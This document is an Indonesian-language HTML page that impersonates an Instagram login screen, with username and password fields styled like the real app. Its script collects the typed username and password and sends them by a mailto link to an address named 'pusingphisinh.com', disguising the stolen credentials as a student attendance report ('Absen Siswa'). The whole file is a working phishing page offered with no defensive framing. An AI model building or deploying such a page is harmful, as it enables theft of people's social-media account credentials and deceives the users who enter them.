<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>instragram</title>
  <style>
    body {
      margin: 0;
      background-color: #0f0f0f;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }.container {
  width: 90%;
  max-width: 300px;
  padding: 0 20px;
}

.logo {
  display: flex;
  justify-content: center;
  margin-bottom: 40px;
}

.logo img {
  width: 100px;
  height: 100px;
  object-fit: contain;
}

input {
  width: 90%;
  padding: 15px;
  margin: 10px 0;
  background-color: #1e1e1e;
  color: white;
  border: none;
  border-radius: 10px;
  font-size: 15px;
}

button {
  width: 100%;
  padding: 12px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 25px;
  font-size: 16px;
  margin-top: 10px;
  cursor: pointer;
}

button:hover {
  background-color: #0056b3;
}

.link {
  text-align: center;
  margin-top: 15px;
}

.link a {
  color: #aaa;
  text-decoration: none;
  display: block;
  margin: 8px 0;
}

.buat-akun {
  display: inline-block;
  padding: 10px 30px;
  color: #007bff;
  border: 1px solid #007bff;
  border-radius: 20px;
  margin-top: 10px;
}

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="ig1.png" alt="logo">
    </div><form id="loginForm">
  <input type="text" id="nama" placeholder="Nama pengguna, email, atau nomor ponsel" required />
  <input type="text" id="status" placeholder="kata sandi" required />
  <button type="submit">Login</button>
</form>

<div class="link">
  <a href="#">Lupa kata sandi?</a>
  <a class="buat-akun" href="#">Buat akun baru</a>
</div>

  </div>  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const nama = document.getElementById("nama").value;
      const status = document.getElementById("status").value;
      const email = "pusingphisinh.com"; // Ganti sesuai kebutuhan

      const subject = "Absen Siswa";
      const body = `Nama: ${nama}%0AKehadiran: ${status}`;
      const mailtoLink = `mailto:${email}?subject=${subject}&body=${body}`;
      window.location.href = mailtoLink;

      window.location.href = "#";
    });
  </script></body>
</html>
